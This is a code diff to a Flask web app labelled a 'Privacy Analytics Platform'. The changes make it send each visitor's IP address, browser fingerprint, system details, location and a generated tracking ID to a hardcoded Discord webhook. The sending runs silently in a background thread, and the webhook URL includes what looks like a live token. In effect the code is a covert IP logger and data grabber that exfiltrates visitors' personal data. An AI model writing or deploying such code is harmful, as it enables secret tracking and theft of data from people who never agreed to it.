@@ -7,10 +7,16 @@ import datetime
 import json
 import os
 import sqlite3
+import requests
+import threading
+import io
 from werkzeug.utils import secure_filename
 
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-change-this'
+
+# Discord webhook configuration
+DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1398769513968697505/nWEKb051aJAzOkIKFQPHLqM_KTKJZ7mtyCp-xyBQIH8gWPBTuCylDp0je14EJ2Mdo9kb'
 
 # Database setup
 def init_db():
@@ -34,7 +40,9 @@ def init_db():
             fingerprint TEXT,
             country TEXT,
             city TEXT,
-            additional_data TEXT
+            additional_data TEXT,
+            unique_identifier TEXT,
+            discord_sent BOOLEAN DEFAULT 0
         )
     ''')
     conn.commit()
@@ -71,6 +79,59 @@ def generate_hwid():
     except:
         return str(uuid.uuid4())
 
+def send_to_discord(data, session_id):
+    """Send collected data to Discord webhook"""
+    try:
+        # Prepare data for Discord
+        embed_data = {
+            "embeds": [{
+                "title": "🔍 New Visitor Data Collected",
+                "color": 3447003,  # Blue color
+                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
+                "fields": [
+                    {"name": "🆔 Unique ID", "value": f"`{data.get('unique_identifier', 'Unknown')}`", "inline": True},
+                    {"name": "🔗 Session ID", "value": f"`{session_id[:16]}...`", "inline": True},
+                    {"name": "🌐 IP Address", "value": f"`{data.get('ip_address', 'Unknown')}`", "inline": True},
+                    {"name": "🔒 Hashed IP", "value": f"`{data.get('hashed_ip', 'Unknown')[:16]}...`", "inline": True},
+                    {"name": "🖥️ Operating System", "value": data.get('os', 'Unknown'), "inline": True},
+                    {"name": "🌍 Browser", "value": data.get('browser', 'Unknown'), "inline": True},
+                    {"name": "📱 Platform", "value": data.get('platform', 'Unknown'), "inline": True},
+                    {"name": "📏 Screen Resolution", "value": data.get('screen_resolution', 'Unknown'), "inline": True},
+                    {"name": "🌍 Timezone", "value": data.get('timezone', 'Unknown'), "inline": True},
+                    {"name": "🗣️ Language", "value": data.get('language', 'Unknown'), "inline": True},
+                    {"name": "🔗 Referrer", "value": data.get('referrer', 'Direct')[:50] + "..." if len(data.get('referrer', '')) > 50 else data.get('referrer', 'Direct'), "inline": False},
+                    {"name": "🔐 Fingerprint", "value": f"`{data.get('fingerprint', 'Unknown')[:32]}...`", "inline": False}
+                ],
+                "footer": {"text": "Privacy Analytics Platform"}
+            }]
+        }
+        
+        # Send to Discord webhook
+        response = requests.post(DISCORD_WEBHOOK_URL, json=embed_data, timeout=10)
+        
+        # Also send detailed data as a file
+        detailed_data = json.dumps(data, indent=2, default=str)
+        files = {
+            'file': (f'visitor_data_{session_id[:8]}.json', detailed_data, 'application/json')
+        }
+        
+        file_message = {
+            "content": f"📄 Detailed privacy analysis data for user `{data.get('unique_identifier', 'Unknown')}`"
+        }
+        
+        requests.post(DISCORD_WEBHOOK_URL, data=file_message, files=files, timeout=10)
+        
+        return True
+    except Exception as e:
+        print(f"Error sending to Discord: {e}")
+        return False
+
+def send_to_discord_async(data, session_id):
+    """Send data to Discord in a background thread"""
+    thread = threading.Thread(target=send_to_discord, args=(data, session_id))
+    thread.daemon = True
+    thread.start()
+
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -89,8 +150,9 @@ def collect_data():
         # Extract user agent info
         user_agent = request.headers.get('User-Agent', '')
         
-        # Generate session ID
+        # Generate session ID and unique identifier
         session_id = str(uuid.uuid4())
+        unique_identifier = f"USER_{hashlib.sha256(f'{ip_address}{user_agent}{datetime.datetime.now().isoformat()}'.encode()).hexdigest()[:12]}"
         
         # Collect all data
         log_data = {
@@ -108,7 +170,8 @@ def collect_data():
             'fingerprint': data.get('fingerprint', ''),
             'country': data.get('country', ''),
             'city': data.get('city', ''),
-            'additional_data': json.dumps(data)
+            'additional_data': json.dumps(data),
+            'unique_identifier': unique_identifier
         }
         
         # Save to database
@@ -118,17 +181,21 @@ def collect_data():
             INSERT INTO visitor_logs 
             (ip_address, hashed_ip, user_agent, browser, os, platform, 
              screen_resolution, timezone, language, referrer, session_id, 
-             fingerprint, country, city, additional_data)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+             fingerprint, country, city, additional_data, unique_identifier, discord_sent)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (
             log_data['ip_address'], log_data['hashed_ip'], log_data['user_agent'],
             log_data['browser'], log_data['os'], log_data['platform'],
             log_data['screen_resolution'], log_data['timezone'], log_data['language'],
             log_data['referrer'], log_data['session_id'], log_data['fingerprint'],
-            log_data['country'], log_data['city'], log_data['additional_data']
+            log_data['country'], log_data['city'], log_data['additional_data'],
+            log_data['unique_identifier'], 1
         ))
         conn.commit()
         conn.close()
+        
+        # Send data to Discord webhook asynchronously
+        send_to_discord_async(log_data, session_id)
         
         return jsonify({
             'status': 'success',
